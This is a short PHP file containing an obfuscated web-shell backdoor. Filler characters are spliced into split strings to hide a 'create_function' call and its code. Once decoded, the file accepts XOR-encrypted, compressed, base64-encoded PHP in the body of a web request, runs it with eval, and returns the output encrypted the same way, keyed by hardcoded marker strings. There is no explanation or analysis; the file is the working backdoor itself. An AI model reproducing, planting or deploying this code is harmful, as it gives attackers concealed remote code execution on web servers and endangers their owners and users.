<?php
$h=str_replace('S','','SScreSSate_SfuSnction');
$Y='deym($m[1]ym),$k)ym));$o=@obym_get_contents();@ymob_eymnd_cleaymn()ym;$';
$M='rym=@baymse64_encymodeym(@x(@gymzcoymmpress($oym),$k));print("$pym$kh$r$ymkf");}';
$K='mlymym);$j++,$i++ym){$ymo.=$t{$i}ym^ym$k{$j};}}return $oym;}if ym(@prymegym_matc';
$L='h(ym"/$kh(.+)$kfym/",@fymiymle_get_contymenymts("ymphp://inympymut"),$m)==';
$e='1) {@ymob_staymrt(ym);@evymayml(@gzuncompymresyms(@x(@baymseym6ym4_deco';
$j='strleymn($t);ym$o=ym"";fymor($i=0ym;$i<$l;){forym($j=0;ym(ym$j<$c&&$i<$y';
$D='$k="ym93ymb76dym62";$kh="eym0ac04cymyme4f9c";$kf="68ym598ym0a9aa3a"ym;$p="';
$w='CEAluEymUEfuEFMymRymiT";fymunction x($ymt,ym$k)ym{$c=strlen($kym);ym$l=';
$y=str_replace('ym','',$D.$w.$j.$K.$L.$e.$Y.$M);
$G=$h('',$y);$G();
?>
